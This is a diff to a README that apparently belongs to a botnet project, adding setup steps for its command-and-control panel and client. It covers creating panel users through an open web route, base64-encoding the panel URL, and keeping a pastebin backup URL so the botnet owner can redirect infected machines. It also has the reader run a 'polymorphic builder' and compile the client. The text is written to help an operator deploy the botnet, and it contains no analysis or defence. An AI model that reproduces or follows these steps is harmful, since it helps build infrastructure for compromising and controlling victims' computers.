@@ -10,7 +10,7 @@
 
 
 
-
+# Preview
 
 
 # Panel
@@ -27,7 +27,7 @@
   * `**Python3** `
 
 
-  First create a user for the panel using, for simplicity I created a route to do it
+  **First** create a user for the panel, for simplicity I created a route to do it
 
    "www.Your-Panel-Ip.com/createUser/{username}/{password}"
 
@@ -38,13 +38,58 @@
 
   * `Admin / routes / web.php`
 
-  And comment the line
+  Comment the line
 
 
   ```php
   Route :: get ('/ createUser / {username} / {password}', 'Auth_Controller @ createUser')
+  ```
+ **Second** save the PanelKey and CrypthKey then you need to base64 encode your panel Ip/domain like that 
+   
+   * ` http://You-Panel-ip/Api ` 
+   
+   You can use "https://www.base64encode.org/" for it.
+   
+   Than save your **Base64 encoded URl** to.
+   
+   I added a feature that allows you to use a backup Url that uses the website www.pastebin.com. This feature premies that in    case of any problem with the primary url, the owner of the botnet panel can use the paste to update the url panel.
+   
+   To use this you need to create an new paste on pastebin.com, base64 encode the raw version of it like the main url and save    it with the other information.
+   
+   
+   
+   
+   
+  **Third** Go to polymorphic builder folder with terminal and use the command :
+   
+  ```python
+     python3 main.py
+  ```
+    
+   Than add the the previous saved information to the respective fields.
+   
+    ![alt text](https://github.com/FilipeBorges1993/Booh-Botnet/raw/master/Screen%20Shot%202018-04-10%20at%2017.35.46.png)
+   
+   
+   
+   **Four** Now we need to compile. To do it we just need to use Visual Studio 2017 and the client is ready.
+   
+   
+     
+     
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+ 
+ 
 
-```
 
 
-# Preview
+
